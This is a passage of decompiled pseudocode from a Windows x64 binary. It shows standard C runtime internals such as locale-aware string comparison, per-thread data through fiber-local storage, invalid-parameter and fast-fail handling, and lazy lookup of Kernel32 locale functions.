    *(_QWORD *)a1 = v4;
    *(_QWORD *)(a1 + 8) = *(_QWORD *)(v4 + 144);
    *(_QWORD *)(a1 + 16) = *(_QWORD *)(v4 + 136);
    sub_14001B160(v4, a1 + 8);
    sub_14001B1CC(*(_QWORD *)a1, a1 + 16);
    v5 = *(_DWORD *)(*(_QWORD *)a1 + 936LL);
    if ( (v5 & 2) == 0 )
    {
      *(_DWORD *)(*(_QWORD *)a1 + 936LL) = v5 | 2;
      *(_BYTE *)(a1 + 24) = 1;
    }
    return a1;
  }
  else
  {
    *(_OWORD *)(a1 + 8) = *(_OWORD *)&off_140026798;
    return a1;
  }
}


// ----- sub_14001A0E0 @ 0x14001a0e0 -----
__int64 __fastcall sub_14001A0E0(__int64 a1, __int64 a2)
{
  if ( a1 == 0 || a2 == 0 )
  {
    *(_DWORD *)sub_14001A8F0() = 22;
    sub_14001A770();
  }
  return 0x7FFFFFFF;
}


// ----- sub_14001A110 @ 0x14001a110 -----
__int64 __fastcall sub_14001A110(unsigned __int16 *a1, unsigned __int16 *a2, __int64 a3)
{
  __int64 v3; // r9
  __int64 result; // rax
  int v7; // ecx
  int v8; // r8d
  int v9; // edx
  int v10; // edx

  v3 = a3;
  if ( a3 == 0 )
    return 0;
  do
  {
    v7 = *a1++;
    v8 = *a2++;
    if ( v7 != v8 )
    {
      v9 = v7 + 32;
      if ( (unsigned int)(v7 - 65) > 0x19 )
        v9 = v7;
      v7 = v9;
      v10 = v8 + 32;
      if ( (unsigned int)(v8 - 65) > 0x19 )
        v10 = v8;
      v8 = v10;
    }
    result = (unsigned int)(v7 - v8);
    if ( v7 != v8 )
      break;
    if ( v7 == 0 )
      break;
    --v3;
  }
  while ( v3 != 0 );
  return result;
}


// ----- sub_14001A180 @ 0x14001a180 -----
__int64 __fastcall sub_14001A180(__int64 a1, __int64 a2, __int64 a3)
{
  if ( dword_1400274CC != 0 )
    return sub_14001A1B0(a1, a2, a3, 0);
  if ( a1 != 0 && a2 != 0 )
    return sub_14001A110((unsigned __int16 *)a1, (unsigned __int16 *)a2, a3);
  return sub_14001A0E0(a1, a2);
}


// ----- sub_14001A1B0 @ 0x14001a1b0 -----
__int64 __fastcall sub_14001A1B0(unsigned __int16 *a1, unsigned __int16 *a2, __int64 a3, __int128 *a4)
{
  __int64 v4; // rbp
  unsigned __int16 *v5; // r14
  unsigned __int16 *v6; // rbx
  int v8; // eax
  __int64 v9; // rdx
  unsigned int v10; // edi
  __int64 v11; // rcx
  unsigned __int16 v12; // ax
  __int64 v13; // rcx
  int v14; // esi
  int v15; // edi
  unsigned __int16 v16; // ax
  __int64 v17; // [rsp+20h] [rbp-38h]
  __int128 v18; // [rsp+28h] [rbp-30h] BYREF
  char v19; // [rsp+38h] [rbp-20h]

  v4 = a3;
  v5 = a2;
  v6 = a1;
  if ( a1 != nullptr && a2 != nullptr )
  {
    if ( a3 != 0 )
    {
      v19 = 0;
      if ( a4 != nullptr )
      {
        v18 = *a4;
      }
      else if ( dword_1400274CC != 0 )
      {
        v17 = sub_14001B014();
        *(_QWORD *)&v18 = *(_QWORD *)(v17 + 144);
        *((_QWORD *)&v18 + 1) = *(_QWORD *)(v17 + 136);
        sub_14001B160(v17, &v18);
        sub_14001B1CC(v17, (char *)&v18 + 8);
        v8 = *(_DWORD *)(v17 + 936);
        if ( (v8 & 2) == 0 )
        {
          *(_DWORD *)(v17 + 936) = v8 | 2;
          v19 = 1;
        }
      }
      else
      {
        v18 = *(_OWORD *)&off_140026798;
      }
      v9 = v18;
      if ( *(_QWORD *)(v18 + 312) != 0 )
      {
        do
        {
          v11 = *v6++;
          if ( (unsigned __int16)v11 >= 0x100u )
          {
            v12 = sub_14001ACA0(v11, &v18);
            v9 = v18;
          }
          else
          {
            if ( (*((_BYTE *)qword_140004400 + 2 * (unsigned __int8)v11 + 2) & 1) != 0 )
              LOBYTE(v11) = *(_BYTE *)((unsigned __int8)v11 + *(_QWORD *)(v9 + 272));
            v12 = (unsigned __int8)v11;
          }
          v13 = *v5++;
          v14 = v12;
          v15 = v12;
          if ( (unsigned __int16)v13 >= 0x100u )
          {
            v16 = sub_14001ACA0(v13, &v18);
            v9 = v18;
          }
          else
          {
            if ( (*((_BYTE *)qword_140004400 + 2 * (unsigned __int8)v13 + 2) & 1) != 0 )
              LOBYTE(v13) = *(_BYTE *)((unsigned __int8)v13 + *(_QWORD *)(v9 + 272));
            v16 = (unsigned __int8)v13;
          }
          v10 = v15 - v16;
          if ( v10 != 0 )
            break;
          if ( v14 == 0 )
            break;
          --v4;
        }
        while ( v4 != 0 );
      }
      else
      {
        v10 = sub_14001A110(v6, v5, v4);
      }
      if ( v19 != 0 )
        *(_DWORD *)(v17 + 936) &= ~2u;
      return v10;
    }
    else
    {
      return 0;
    }
  }
  else
  {
    *(_DWORD *)sub_14001A8F0() = 22;
    sub_14001A770();
    return 0x7FFFFFFF;
  }
}


// ----- sub_14001A38C @ 0x14001a38c -----
__int64 __fastcall sub_14001A38C(__int64 a1)
{
  DWORD LastError; // eax
  bool v3; // zf
  __int64 v4; // rdx
  __int64 v5; // rax
  DWORD v6; // ecx
  __int64 v7; // rbx
  DWORD dwErrCode; // [rsp+30h] [rbp+8h] BYREF

  if ( *(_QWORD *)a1 == 0 )
  {
    LastError = GetLastError();
    v3 = *(_BYTE *)(a1 + 16) == 0;
    dwErrCode = LastError;
    if ( v3 )
    {
      *(_QWORD *)(a1 + 8) = 0;
      v4 = 0;
      *(_BYTE *)(a1 + 16) = 1;
    }
    else
    {
      v4 = *(_QWORD *)(a1 + 8);
    }
    v5 = sub_14001B104(&dwErrCode, v4);
    v6 = dwErrCode;
    v7 = v5;
    *(_QWORD *)a1 = v5;
    SetLastError(v6);
    if ( v7 == 0 )
      sub_14001B2E4();
  }
  return *(_QWORD *)a1;
}


// ----- sub_14001A3F4 @ 0x14001a3f4 -----
__int64 __fastcall sub_14001A3F4(__int64 a1)
{
  __int64 v1; // rsi
  __int64 v2; // rdi
  __int64 v4; // rax
  DWORD v5; // ecx
  DWORD dwErrCode; // [rsp+30h] [rbp+8h] BYREF

  v1 = *(_QWORD *)a1;
  v2 = 0;
  if ( *(_QWORD *)a1 == 0 )
  {
    dwErrCode = GetLastError();
    if ( *(_BYTE *)(a1 + 16) != 0 )
    {
      v2 = *(_QWORD *)(a1 + 8);
    }
    else
    {
      *(_QWORD *)(a1 + 8) = 0;
      *(_BYTE *)(a1 + 16) = 1;
    }
    v4 = sub_14001B104(&dwErrCode, v2);
    v5 = dwErrCode;
    v1 = v4;
    *(_QWORD *)a1 = v4;
    SetLastError(v5);
  }
  return v1;
}


// ----- sub_14001A460 @ 0x14001a460 -----
__int64 __fastcall sub_14001A460(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  DWORD LastError; // eax

  v2 = 0;
  if ( *(_BYTE *)(a2 + 16) != 0 )
  {
    v2 = *(_QWORD *)(a2 + 8);
  }
  else
  {
    LastError = GetLastError();
    *(_QWORD *)(a2 + 8) = 0;
    *(_BYTE *)(a2 + 16) = 1;
    SetLastError(LastError);
  }
  return a1 + 8 * v2;
}


// ----- sub_14001A4AC @ 0x14001a4ac -----
LONG __fastcall sub_14001A4AC(unsigned int a1, int a2, int a3)
{
  ULONG64 Rip; // r14
  struct _IMAGE_RUNTIME_FUNCTION_ENTRY *v7; // rax
  BOOL v8; // edi
  LONG result; // eax
  unsigned __int64 ImageBase; // [rsp+40h] [rbp-C0h] BYREF
  unsigned __int64 EstablisherFrame; // [rsp+48h] [rbp-B8h] BYREF
  PVOID HandlerData; // [rsp+50h] [rbp-B0h] BYREF
  struct _EXCEPTION_POINTERS ExceptionInfo; // [rsp+58h] [rbp-A8h] BYREF
  _DWORD v14[4]; // [rsp+70h] [rbp-90h] BYREF
  DWORD64 v15; // [rsp+80h] [rbp-80h]
  struct _CONTEXT ContextRecord; // [rsp+110h] [rbp+10h] BYREF
  DWORD64 retaddr; // [rsp+608h] [rbp+508h]
  __int64 v18; // [rsp+610h] [rbp+510h] BYREF

  if ( a1 != -1 )
    ((void (*)(void))sub_14001DCA0)();
  sub_1400230C0(v14, 0, 152);
  sub_1400230C0(&ContextRecord, 0, 1232);
  EstablisherFrame = 0;
  ImageBase = 0;
  HandlerData = nullptr;
  ExceptionInfo.ExceptionRecord = (PEXCEPTION_RECORD)v14;
  ExceptionInfo.ContextRecord = &ContextRecord;
  RtlCaptureContext(&ContextRecord);
  Rip = ContextRecord.Rip;
  v7 = RtlLookupFunctionEntry(ContextRecord.Rip, &ImageBase, nullptr);
  if ( v7 != nullptr )
    RtlVirtualUnwind(0, ImageBase, Rip, v7, &ContextRecord, &HandlerData, &EstablisherFrame, nullptr);
  ContextRecord.Rip = retaddr;
  v14[0] = a2;
  ContextRecord.Rsp = (DWORD64)&v18;
  v15 = retaddr;
  v14[1] = a3;
  v8 = IsDebuggerPresent();
  SetUnhandledExceptionFilter(nullptr);
  result = UnhandledExceptionFilter(&ExceptionInfo);
  if ( result == 0 && !v8 && a1 != -1 )
    return sub_14001DCA0(a1);
  return result;
}


// ----- sub_14001A61C @ 0x14001a61c -----
__int64 __fastcall sub_14001A61C(int a1, int a2, int a3, int a4, __int64 a5)
{
  __int64 result; // rax
  int v6; // ebx
  int v7; // ebx
  _QWORD v8[2]; // [rsp+30h] [rbp-40h] BYREF
  char v9; // [rsp+40h] [rbp-30h]
  __int128 v10; // [rsp+48h] [rbp-28h]
  char v11; // [rsp+58h] [rbp-18h]
  int v12; // [rsp+5Ch] [rbp-14h]
  char v13; // [rsp+60h] [rbp-10h]
  int v14; // [rsp+64h] [rbp-Ch]
  char v15; // [rsp+68h] [rbp-8h]

  v8[0] = 0;
  v9 = 0;
  v11 = 0;
  v13 = 0;
  v15 = 0;
  if ( dword_1400274CC == 0 )
  {
    v11 = 1;
    v10 = *(_OWORD *)&off_140026798;
  }
  result = sub_14001A6B8(a1, a2, a3, a4, a5, (__int64)v8);
  if ( v11 == 2 )
  {
    result = v8[0];
    *(_DWORD *)(v8[0] + 936LL) &= ~2u;
  }
  if ( v13 != 0 )
  {
    v6 = v12;
    result = sub_14001A38C((__int64)v8);
    *(_DWORD *)(result + 32) = v6;
  }
  if ( v15 != 0 )
  {
    v7 = v14;
    result = sub_14001A38C((__int64)v8);
    *(_DWORD *)(result + 36) = v7;
  }
  return result;
}


// ----- sub_14001A6B8 @ 0x14001a6b8 -----
__int64 __fastcall sub_14001A6B8(__int64 a1, __int64 a2, __int64 a3, unsigned int a4, __int64 a5, __int64 a6)
{
  __int64 v10; // rax
  __int64 (__fastcall *v11)(__int64, __int64, __int64, _QWORD, __int64); // rax
  __int64 (__fastcall *v13)(__int64, __int64, __int64, _QWORD, __int64); // r10

  v10 = sub_14001A3F4(a6);
  if ( v10 != 0 )
  {
    v11 = *(__int64 (__fastcall **)(__int64, __int64, __int64, _QWORD, __int64))(v10 + 952);
    if ( v11 != nullptr )
      return v11(a1, a2, a3, a4, a5);
  }
  v13 = (__int64 (__fastcall *)(__int64, __int64, __int64, _QWORD, __int64))__ROR8__(
                                                                              _security_cookie
                                                                            ^ *(_QWORD *)sub_14001A460(
                                                                                           (__int64)&unk_140027408,
                                                                                           a6),
                                                                              _security_cookie & 0x3F);
  if ( v13 == nullptr )
  {
    sub_14001A790(a1, a2, a3, a4, a5);
    JUMPOUT(0x14001A76ELL);
  }
  return v13(a1, a2, a3, a4, a5);
}


// ----- sub_14001A770 @ 0x14001a770 -----
__int64 sub_14001A770()
{
  return sub_14001A61C(0, 0, 0, 0, 0);
}


// ----- sub_14001A790 @ 0x14001a790 -----
BOOL sub_14001A790()
{
  HANDLE CurrentProcess; // rax

  if ( IsProcessorFeaturePresent(0x17u) )
    __fastfail(5u);
  sub_14001A4AC(2u, -1073740777, 1);
  CurrentProcess = GetCurrentProcess();
  return TerminateProcess(CurrentProcess, 0xC0000417);
}


// ----- sub_14001A7D8 @ 0x14001a7d8 -----
__int64 __fastcall sub_14001A7D8(unsigned int a1)
{
  __int64 result; // rax
  unsigned __int64 v3; // rcx
  unsigned __int64 v4; // r10
  __int64 v5; // rdi
  unsigned __int64 v6; // r8
  bool v7; // zf
  unsigned __int64 v8; // r11
  __int64 *v9; // rax
  bool v10; // cf
  unsigned __int64 v11; // rax

  if ( a1 != 0 )
  {
    if ( a1 <= 0xD )
      return HIDWORD(qword_140002F30[a1 - 1]);
    if ( a1 <= 0x718 )
    {
      v3 = 45;
      v4 = 0;
      v5 = 44;
      while ( 1 )
      {
        v6 = v3 >> 1;
        if ( v3 >> 1 == 0 )
          break;
        v7 = (v3 & 1) == 0;
        v3 = v6 - 1;
        if ( !v7 )
          v3 = v6;
        v8 = v3 + v4;
        v9 = &qword_140002F30[v3 + v4];
        v10 = a1 < *(_DWORD *)v9;
        if ( a1 == *(_DWORD *)v9 )
          goto LABEL_20;
        if ( a1 >= *(_DWORD *)v9 )
        {
          v4 = v8 + 1;
          v3 = v6;
        }
        v11 = v8 - 1;
        if ( !v10 )
          v11 = v5;
        v5 = v11;
        if ( v4 > v11 )
          goto LABEL_15;
      }
      if ( v3 == 0 )
        goto LABEL_15;
      v9 = &qword_140002F30[v4];
      if ( a1 != *(_DWORD *)v9 )
        v9 = nullptr;
LABEL_20:
      if ( v9 != nullptr )
        return *((unsigned int *)v9 + 1);
    }
  }
LABEL_15:
  if ( a1 - 19 <= 0x11 )
    return 13;
  result = 22;
  if ( a1 - 188 <= 0xE )
    return 8;
  return result;
}


// ----- sub_14001A8A8 @ 0x14001a8a8 -----
__int64 __fastcall sub_14001A8A8(unsigned int a1, __int64 a2)
{
  __int64 result; // rax

  *(_BYTE *)(a2 + 56) = 1;
  *(_DWORD *)(a2 + 52) = a1;
  result = sub_14001A7D8(a1);
  *(_DWORD *)(a2 + 44) = result;
  *(_BYTE *)(a2 + 48) = 1;
  return result;
}


// ----- sub_14001A8CC @ 0x14001a8cc -----
void *sub_14001A8CC()
{
  __int64 v0; // rcx
  void *result; // rax

  v0 = sub_14001B074();
  result = (void *)(v0 + 36);
  if ( v0 == 0 )
    return &unk_140026634;
  return result;
}


// ----- sub_14001A8F0 @ 0x14001a8f0 -----
void *sub_14001A8F0()
{
  __int64 v0; // rcx
  void *result; // rax

  v0 = sub_14001B074();
  result = (void *)(v0 + 32);
  if ( v0 == 0 )
    return &unk_140026630;
  return result;
}


// ----- sub_14001A914 @ 0x14001a914 -----
FARPROC __fastcall sub_14001A914(unsigned int a1, const CHAR *a2, unsigned int *a3, unsigned int *a4)
{
  __int64 v4; // r12
  unsigned int *v6; // rsi
  __int64 v8; // rdi
  HMODULE Library; // rbx
  const WCHAR *v10; // rbp
  FARPROC ProcAddress; // rbx
  __int64 v12; // rax
  DWORD flOldProtect; // [rsp+60h] [rbp+18h] BYREF

  v4 = a1;
  v6 = a3;
  if ( a3 == a4 )
  {
LABEL_12:
    ProcAddress = nullptr;
    goto LABEL_13;
  }
  while ( 1 )
  {
    v8 = *v6;
    Library = (HMODULE)qword_140027410[v8];
    if ( Library == nullptr )
      break;
    if ( Library != (HMODULE)-1LL )
      goto LABEL_20;
LABEL_11:
    if ( ++v6 == a4 )
      goto LABEL_12;
  }
  v10 = off_1400030A0[v8];
  Library = LoadLibraryExW(v10, nullptr, 0x800u);
  if ( Library == nullptr
    && (GetLastError() != 87
     || (unsigned int)sub_14001B340(v10, L"api-ms-", 7) == 0
     || (unsigned int)sub_14001B340(v10, L"ext-ms-", 7) == 0
     || (Library = LoadLibraryExW(v10, nullptr, 0)) == nullptr) )
  {
    _InterlockedExchange64(&qword_140027410[v8], -1);
    goto LABEL_11;
  }
  if ( _InterlockedExchange64(&qword_140027410[v8], (__int64)Library) != 0 )
    FreeLibrary(Library);
LABEL_20:
  ProcAddress = GetProcAddress(Library, a2);
LABEL_13:
  sub_14001B374(14);
  flOldProtect = 0;
  if ( VirtualProtect(qword_14002C000, 0x100u, 4u, &flOldProtect) )
  {
    v12 = (__int64)ProcAddress;
    if ( ProcAddress == nullptr )
      v12 = -1;
    _InterlockedExchange64(&qword_14002C000[v4], v12);
    if ( VirtualProtect(qword_14002C000, 0x100u, 2u, &flOldProtect) )
    {
      sub_14001B390(14);
      return ProcAddress;
    }
  }
  sub_14001B2E4();
}


// ----- sub_14001AAC8 @ 0x14001aac8 -----
__int64 __fastcall sub_14001AAC8(__int64 a1)
{
  FARPROC v1; // rax

  v1 = (FARPROC)qword_14002C0D0;
  if ( qword_14002C0D0 != -1
    && (qword_14002C0D0 != 0
     || (v1 = sub_14001A914(
                0x1Au,
                "AppPolicyGetProcessTerminationMethod",
                (unsigned int *)&dword_14000372C,
                (unsigned int *)"AppPolicyGetProcessTerminationMethod")) != nullptr) )
  {
    return ((__int64 (__fastcall *)(__int64, __int64))v1)(-6, a1);
  }
  else
  {
    return 3221226021LL;
  }
}


// ----- FlsGetValue @ 0x14001ab24 -----
// attributes: thunk
PVOID __stdcall FlsGetValue(DWORD dwFlsIndex)
{
  return __imp_FlsGetValue(dwFlsIndex);
}


// ----- sub_14001AB2C @ 0x14001ab2c -----
__int64 sub_14001AB2C()
{
  return qword_14002C018();
}


// ----- FlsSetValue @ 0x14001ab38 -----
// attributes: thunk
BOOL __stdcall FlsSetValue(DWORD dwFlsIndex, PVOID lpFlsData)
{
  return __imp_FlsSetValue(dwFlsIndex, lpFlsData);
}


// ----- InitializeCriticalSectionEx @ 0x14001ab40 -----
// attributes: thunk
BOOL __stdcall InitializeCriticalSectionEx(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount, DWORD Flags)
{
  return __imp_InitializeCriticalSectionEx(lpCriticalSection, dwSpinCount, Flags);
}


// ----- sub_14001AB48 @ 0x14001ab48 -----
int __fastcall sub_14001AB48(
        __int64 a1,
        DWORD a2,
        const WCHAR *a3,
        unsigned int a4,
        WCHAR *lpDestStr,
        int cchDest,
        __int64 a7,
        __int64 a8,
        __int64 a9)
{
  FARPROC v9; // r10
  LCID v15; // eax

  v9 = (FARPROC)qword_14002C090;
  if ( qword_14002C090 != -1 )
  {
    if ( qword_14002C090 != 0 )
      return ((__int64 (__fastcall *)(__int64, _QWORD, const WCHAR *, _QWORD, WCHAR *, int, __int64, __int64, __int64))v9)(
               a1,
               a2,
               a3,
               a4,
               lpDestStr,
               cchDest,
               a7,
               a8,
               a9);
    v9 = sub_14001A914(0x12u, "LCMapStringEx", (unsigned int *)&qword_1400036F8, (unsigned int *)"LCMapStringEx");
    if ( v9 != nullptr )
      return ((__int64 (__fastcall *)(__int64, _QWORD, const WCHAR *, _QWORD, WCHAR *, int, __int64, __int64, __int64))v9)(
               a1,
               a2,
               a3,
               a4,
               lpDestStr,
               cchDest,
               a7,
               a8,
               a9);
  }
  v15 = sub_14001AC3C(a1, 0);
  return LCMapStringW(v15, a2, a3, a4, lpDestStr, cchDest);
}


// ----- sub_14001AC3C @ 0x14001ac3c -----
__int64 __fastcall sub_14001AC3C(__int64 a1, unsigned int a2)
{
  FARPROC v2; // rax

  v2 = (FARPROC)qword_14002C0A0;
  if ( qword_14002C0A0 != -1
    && (qword_14002C0A0 != 0
     || (v2 = sub_14001A914(
                0x14u,
                "LocaleNameToLCID",
                (unsigned int *)&qword_140003710,
                (unsigned int *)"LocaleNameToLCID")) != nullptr) )
  {
    return ((__int64 (__fastcall *)(__int64, _QWORD))v2)(a1, a2);
  }
  else
  {
    return sub_14001B3AC(a1);
  }
}


// ----- sub_14001ACA0 @ 0x14001aca0 -----
__int64 __fastcall sub_14001ACA0(unsigned __int16 a1, _OWORD *a2)
{
  __int64 result; // rax
  __int64 v3; // rcx
  unsigned __int16 v4; // dx
  int v5; // eax
  __int64 v6; // [rsp+30h] [rbp-20h] BYREF
  __int64 v7; // [rsp+38h] [rbp-18h]
  char v8; // [rsp+48h] [rbp-8h]
  unsigned __int16 v9; // [rsp+60h] [rbp+10h] BYREF
  unsigned __int16 v10; // [rsp+70h] [rbp+20h] BYREF

  v9 = a1;
  result = 0xFFFF;
  if ( a1 == 0xFFFF )
    return result;
  sub_14001A020((__int64)&v6, a2);
  if ( *(_DWORD *)(v7 + 12) != 65001 )
  {
    v4 = v9;
    if ( v9 < 0x100u )
    {
      if ( (*((_BYTE *)qword_140004400 + 2 * (unsigned __int8)v9 + 2) & 1) == 0 )
      {
        v4 = (unsigned __int8)v9;
        goto LABEL_15;
      }
      v3 = (unsigned __int8)v9;
      goto LABEL_10;
    }
    if ( *(_QWORD *)(v7 + 312) == 0 )
      goto LABEL_15;
LABEL_13:
    v10 = 0;
    v5 = sub_14001B484(*(_QWORD *)(v7 + 312), 256, (unsigned int)&v9, 1, (__int64)&v10, 1);
    v4 = v9;
    if ( v5 != 0 )
      v4 = v10;
    goto LABEL_15;
  }
  if ( v9 >= 0x80u )
    goto LABEL_13;
  if ( (*((_BYTE *)qword_140004400 + 2 * (unsigned __int8)v9 + 2) & 1) != 0 )
  {
    v3 = (unsigned __int8)v9;
LABEL_10:
    v4 = *(unsigned __int8 *)(*(_QWORD *)(v7 + 272) + v3);
    goto LABEL_15;
  }
  v4 = (unsigned __int8)v9;
LABEL_15:
  if ( v8 != 0 )
    *(_DWORD *)(v6 + 936) &= ~2u;
  return v4;
}


// ----- sub_14001AD9C @ 0x14001ad9c -----
__int64 __fastcall sub_14001AD9C(__int64 a1, unsigned int *a2, __int64 a3, unsigned int *a4)
{
  sub_14001B374(*a2);
  _InterlockedIncrement(*(volatile signed __int32 **)(**(_QWORD **)a3 + 136LL));
  return sub_14001B390(*a4);
}


// ----- sub_14001ADDC @ 0x14001addc -----
__int64 __fastcall sub_14001ADDC(__int64 a1, unsigned int *a2, __int64 a3, unsigned int *a4)
{
  sub_14001B374(*a2);
  sub_14001AFAC(**(_QWORD **)a3, ***(_QWORD ***)(a3 + 8));
  return sub_14001B390(*a4);
}


// ----- sub_14001AE24 @ 0x14001ae24 -----
__int64 __fastcall sub_14001AE24(__int64 a1)
{
  unsigned int v2; // [rsp+20h] [rbp-30h] BYREF
  unsigned int v3; // [rsp+24h] [rbp-2Ch] BYREF
  __int64 v4; // [rsp+28h] [rbp-28h] BYREF
  __int64 *v5; // [rsp+30h] [rbp-20h] BYREF
  __int64 *v6; // [rsp+38h] [rbp-18h] BYREF
  _QWORD v7[2]; // [rsp+40h] [rbp-10h] BYREF
  char v8; // [rsp+68h] [rbp+18h] BYREF
  unsigned int v9; // [rsp+70h] [rbp+20h] BYREF
  unsigned int v10; // [rsp+78h] [rbp+28h] BYREF

  v4 = a1;
  v6 = &v4;
  v9 = 5;
  v10 = 5;
  v7[0] = &v4;
  v7[1] = &v5;
  v2 = 4;
  v3 = 4;
  v5 = &qword_1400274D0;
  *(_DWORD *)(a1 + 40) = 1;
  *(_QWORD *)v4 = qword_140007970;
  *(_DWORD *)(v4 + 936) = 1;
  *(_QWORD *)(v4 + 136) = &unk_1400267B0;
  *(_WORD *)(v4 + 188) = 67;
  *(_WORD *)(v4 + 450) = 67;
  *(_QWORD *)(v4 + 928) = 0;
  sub_14001AD9C((__int64)&v8, &v10, (__int64)&v6, &v9);
  return sub_14001ADDC((__int64)&v8, &v3, (__int64)v7, &v2);
}


// ----- sub_14001AEF4 @ 0x14001aef4 -----
void *sub_14001AEF4()
{
  DWORD LastError; // edi
  void *v1; // rsi
  void *v3; // rax
  void *v4; // rbx

  LastError = GetLastError();
  v1 = nullptr;
  if ( !FlsSetValue(dwFlsIndex, (PVOID)0xFFFFFFFFFFFFFFFFLL) )
    goto LABEL_2;
  v3 = (void *)sub_14001B510(1, 968);
  v4 = v3;
  if ( v3 == nullptr )
  {
    FlsSetValue(dwFlsIndex, nullptr);
    sub_14001B590(nullptr);
LABEL_2:
    SetLastError(LastError);
    return nullptr;
  }
  if ( FlsSetValue(dwFlsIndex, v3) )
  {
    sub_14001AE24((__int64)v4);
    sub_14001B590(nullptr);
    v1 = v4;
  }
  else
  {
    FlsSetValue(dwFlsIndex, nullptr);
    sub_14001B590(v4);
  }
  SetLastError(LastError);
  return v1;
}


// ----- sub_14001AFAC @ 0x14001afac -----
wchar_t **__fastcall sub_14001AFAC(__int64 a1, __int64 a2)
{
  wchar_t **result; // rax
  wchar_t **v5; // rcx

  if ( *(_QWORD *)(a1 + 144) != 0 )
  {
    result = (wchar_t **)sub_14001B874();
    v5 = *(wchar_t ***)(a1 + 144);
    if ( v5 != (wchar_t **)qword_1400274D0 )
    {
      result = &off_140026640;
      if ( v5 != &off_140026640 && *((_DWORD *)v5 + 4) == 0 )
        result = (wchar_t **)sub_14001B674(v5);
    }
  }
  *(_QWORD *)(a1 + 144) = a2;
  if ( a2 != 0 )
    return (wchar_t **)sub_14001B5E8(a2);
  return result;
}


// ----- sub_14001B014 @ 0x14001b014 -----
__int64 sub_14001B014()
{
  __int64 result; // rax

  result = sub_14001B074();
  if ( result == 0 )
    sub_14001B2E4();
  return result;
}


// ----- sub_14001B030 @ 0x14001b030 -----
PVOID sub_14001B030()
{
  __int64 v0; // rcx
  PVOID result; // rax

  v0 = dwFlsIndex;
  if ( dwFlsIndex == -1 )
    result = nullptr;
  else
    result = FlsGetValue(dwFlsIndex);
  if ( result == (PVOID)-1LL || result == nullptr && (result = sub_14001AEF4()) == nullptr )
    sub_14001B2E4(v0);
  return result;
}


// ----- sub_14001B074 @ 0x14001b074 -----
PVOID sub_14001B074()
{
  PVOID v0; // rdi
  __int64 v1; // rax
  DWORD LastError; // ebx
  PVOID Value; // rax

  v0 = nullptr;
  if ( byte_1400274C8 != 0 )
  {
    if ( dwFlsIndex == -1 )
      v1 = 0;
    else
      v1 = sub_14001AB2C();
    if ( v1 != -1 )
    {
      if ( v1 == 0 )
        return sub_14001AEF4();
      return (PVOID)v1;
    }
  }
  else
  {
    LastError = GetLastError();
    if ( dwFlsIndex == -1 )
      Value = nullptr;
    else
      Value = FlsGetValue(dwFlsIndex);
    if ( Value != (PVOID)-1LL )
    {
      if ( Value == nullptr )
        Value = sub_14001AEF4();
      v0 = Value;
    }
    SetLastError(LastError);
  }
  return v0;
}


// ----- sub_14001B104 @ 0x14001b104 -----
char *__fastcall sub_14001B104(__int64 a1, __int64 a2)
{
  __int64 v3; // rbx
  char *Value; // rax

  v3 = 0;
  if ( dwFlsIndex == -1 )
    Value = nullptr;
  else
    Value = (char *)FlsGetValue(dwFlsIndex);
  if ( Value != (char *)-1LL )
  {
    if ( Value != nullptr )
      return &Value[968 * a2];
    Value = (char *)sub_14001AEF4();
    if ( Value != nullptr )
      return &Value[968 * a2];
  }
  return (char *)v3;
}


// ----- sub_14001B160 @ 0x14001b160 -----
__int64 __fastcall sub_14001B160(__int64 a1, __int64 *a2)
{
  __int64 result; // rax

  result = qword_1400274D0;
  if ( *a2 != qword_1400274D0 )
  {
    result = *(unsigned int *)(a1 + 936);
    if ( ((unsigned int)result & dword_140026CF0) == 0 )
    {
      result = sub_14001B91C();
      *a2 = result;
    }
  }
  return result;
}


// ----- sub_14001B194 @ 0x14001b194 -----
__int64 __fastcall sub_14001B194(__int64 a1, __int64 *a2, __int64 a3)
{
  __int64 result; // rax

  result = qword_1400274D0[a3];
  if ( *a2 != result )
  {
    result = *(unsigned int *)(a1 + 936);
    if ( ((unsigned int)result & dword_140026CF0) == 0 )
    {
      result = sub_14001B91C();
      *a2 = result;
    }
  }
  return result;
}


// ----- sub_14001B1CC @ 0x14001b1cc -----
__int64 __fastcall sub_14001B1CC(__int64 a1, __int64 *a2)
{
  __int64 result; // rax

  result = qword_140027750;
  if ( *a2 != qword_140027750 )
  {
    result = *(unsigned int *)(a1 + 936);
    if ( ((unsigned int)result & dword_140026CF0) == 0 )
    {
      result = sub_14001C25C();
      *a2 = result;
    }
  }
  return result;
}


// ----- sub_14001B200 @ 0x14001b200 -----
__int64 __fastcall sub_14001B200(__int64 a1, __int64 *a2, __int64 a3)
{
  __int64 result; // rax

  result = qword_140027750[a3];
  if ( *a2 != result )
  {
    result = *(unsigned int *)(a1 + 936);
    if ( ((unsigned int)result & dword_140026CF0) == 0 )
    {
      result = sub_14001C25C();
      *a2 = result;
    }
  }
  return result;
}


// ----- sub_14001B238 @ 0x14001b238 -----
__int64 __fastcall sub_14001B238(__int64 a1, unsigned int *a2, __int64 a3, unsigned int *a4)
{
  __int64 *i; // rbx

  sub_14001B374(*a2);
  for ( i = qword_1400274D0; i != (__int64 *)&unk_1400274D8; ++i )
  {
    if ( (wchar_t **)*i != &off_140026640 )
      *i = sub_14001B98C(i, &off_140026640);
  }
  return sub_14001B390(*a4);
}


// ----- sub_14001B2A8 @ 0x14001b2a8 -----
__int64 sub_14001B2A8()
{
  return (unsigned int)_InterlockedExchange(&dword_1400274CC, 1);
}


// ----- sub_14001B2B4 @ 0x14001b2b4 -----
__int64 sub_14001B2B4()
{
  __int64 v1; // [rsp+30h] [rbp+8h] BYREF
  unsigned int v2; // [rsp+38h] [rbp+10h] BYREF
  unsigned int v3; // [rsp+40h] [rbp+18h] BYREF

  v2 = 4;
  v3 = 4;
  return sub_14001B238((__int64)&v1, &v3, (__int64)&v1, &v2);
}


// ----- sub_14001B2E4 @ 0x14001b2e4 -----
void __noreturn sub_14001B2E4()
{
  if ( sub_14001CF4C() != 0 )
    sub_14001CF7C(22);
  if ( (byte_1400267AC & 2) != 0 )
  {
    if ( IsProcessorFeaturePresent(0x17u) )
      __fastfail(7u);
    sub_14001A4AC(3u, 1073741845, 1);
  }
  sub_14001CEF8(3);
  JUMPOUT(0x14001B339LL);
}


// ----- sub_14001B340 @ 0x14001b340 -----
__int64 __fastcall sub_14001B340(_WORD *a1, _WORD *a2, __int64 a3)
{
  __int64 i; // r8

  if ( a3 == 0 )
    return 0;
  for ( i = a3 - 1; i != 0; --i )
  {
    if ( *a1 == 0 )
      break;
    if ( *a1 != *a2 )
